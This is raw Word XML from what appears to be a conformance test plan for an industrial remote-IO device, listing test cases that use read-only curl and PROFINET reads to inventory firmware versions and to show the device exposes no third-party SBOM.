            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>confidentiality</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B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F4F30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NIST SP 800-115 §3.5 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>sniffing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>); OWASP ISTG-DES-INFO; ifm CM-005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DD55B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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="5FB97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CA3D1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55355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 xml:space="preserve">Data-identification fingerprint check: read I&amp;M4 for config A; load a different config B; read I&amp;M4; confirm the signature uniquely </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>characterises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the loaded config (identification limb)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AA584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 xml:space="preserve">Confirms the </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>partial</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> data-identification (corrects G-1) — as identification, not modification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C974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Requirements-based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verification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4BFA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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="64E40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E7DBB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del w:id="11" w:author="Unknown">
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:delText>TS — MITM identity falsification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A4D91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E9D53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Moved to RQ-005 (protection). Cross-</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>referenced.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6577D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lastRenderedPageBreak/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7242F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—</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1BF016BB" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: TS-1/TS-2/TS-4 over the management path (Pi eth1 = 192.168.50.10 → IoT-Core; browser 192.168.50.20); TS-3 passive on the laptop mirror. </w:t>
      </w:r>
      <w:hyperlink r:id="rId97" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId98" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="64A4BC34" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00000000" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:pict w14:anchorId="52E3E07C">
          <v:rect id="_x0000_i1047" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED5008B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Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C828C51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Full entries for the inventory baseline (TS-1) and the decisive SBOM proof (TS-2). TS-3 executes per the plaintext-recon method; TS-4 is a short identification-fingerprint confirmation. The MITM identity-falsification case is removed from RQ-004 and belongs to RQ-005.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="674DE5A0" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00000000" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:pict w14:anchorId="0B27E9A4">
          <v:rect id="_x0000_i1048" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="326F220A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TC-RQ004-01 — Identification-Surface Inventory (SW + Data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C799739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770"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="462008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AB4B63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77DB2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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="1476B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EC343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5C080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TC-RQ004-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="266D5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ED83B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A11E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RQ-004 (EHSR </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>identification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obligation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>) → CR 7.8 → Asset D (SW) + Asset B (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> via I&amp;M4)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="10D18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0951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4BA71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Information Disclosure / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>incomplete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identification</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="3D0A5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EA87B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SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9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24E80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SVV-1 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Requirements-based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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="30E73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5890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708BF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 xml:space="preserve">Enumerate the complete identification set the device exposes; confirm it identifies safety software (firmware/bootloader/stack versions) and safety data (parameter-set fingerprint via I&amp;M4); diff against the expected EHSR-critical </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SW+data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set to reveal the SBOM completeness gap.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="0CD2E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DDA96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Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9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78129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1. Retrieve all /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>deviceinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/* version fields. 2. Read I&amp;M0, I&amp;M4 (signature), I&amp;M5. 3. Read /firmware/version, /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>fieldbussetup</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>fieldbusfirmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>. 4. Compile the inventory; compare against the expected set (incl. third-party components).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="6AAB2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A3C2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2A545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 xml:space="preserve">PASS (partial-conformance baseline) </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff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the device returns top-level SW identification and a data-identification fingerprint (I&amp;M4). Documented shortfall </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff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no SBOM of third-party components is present and no explicit safety-critical-data classification is exposed.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="420FB527" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9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E404B9" w:rsidRPr="00E404B9" w14:paraId="110107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A56BE3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28D1AF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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="0CB26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9273F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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B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37F2A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TC-RQ004-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="6BBB9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74C02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BBBA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DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>browser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> 192.168.50.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="7EDBF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64FC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F7DDA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curl / IoT-Core visualizer; PROFINET acyclic read for I&amp;M0/4/5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="57C5EFBD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lastRenderedPageBreak/>
        <w:t># TC-RQ004-01 Full identification-surface enumeration (REVISION_COUNTER excluded)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8B1A79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for ep in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo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hwversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo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hwrevision</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo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swrevision</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7683749D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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo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swinfo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cpubootloaderversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo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swinfo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scpuversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1D9104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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo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swinfo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scpubootloaderversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> firmware/version firmware/type &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0551022D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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fieldbussetup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fieldbusfirmware</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCD22E9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echo "== $ep =="; curl -s "</w:t>
      </w:r>
      <w:hyperlink r:id="rId99" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/$ep</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC0FEB7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done | tee TC01_swid.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F8838E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# I&amp;M0 (identity), I&amp;M4 (parameter-set FINGERPRINT = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Par_CRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), I&amp;M5 (host </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) via acyclic PN read</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69DBA697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# NOTE: REVISION_COUNTER is NOT read here — it is modification evidence (RQ-009), not identification.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A92DE0D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| Expected | SW versions returned; I&amp;M4 = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_iParCRC+F_Par_CRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (data fingerprint); no SBOM of µC/OS-II, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack, STM STL, netX90. | | Result | ☐ SW identified ☐ Data fingerprint (I&amp;M4) present ☐ No SBOM (G-2) | | Evidence | TC01_swid.txt, I&amp;M0/4/5 read logs, inventory-vs-expected diff table | </w:t>
      </w:r>
      <w:hyperlink r:id="rId100" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5F5D617A" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00000000" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:pict w14:anchorId="153ADDF8">
          <v:rect id="_x0000_i1049" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C716D79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TC-RQ004-02 — SBOM Completeness &amp; Third-Party CVE-Correlation Gap (G-2 proof — decisive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468180DD" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9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7754"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="39CD2D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398A2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76F621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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="5518F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FF4F7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56AA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TC-RQ004-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="2E336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37FF7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0F56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RQ-004 → CR 7.8 (SBOM </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>limb</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>) / 4-1 SM-9-SM-10 → Asset D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="6355A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C27C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FB73F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Information Disclosure (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>incomplete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inventory</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>un-managed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vulnerability</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="5E54E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CBF8A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SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9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D0DB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SVV-3 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Vulnerability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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="1D10AE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9CCA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CB88C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Demonstrate that the exposed inventory is top-level only and provides no SBOM of the safety-critical third-party components, so their versions cannot be enumerated or CVE-correlated — CR 7.8 met at product granularity but not at component granularity.</w:t>
            </w:r>
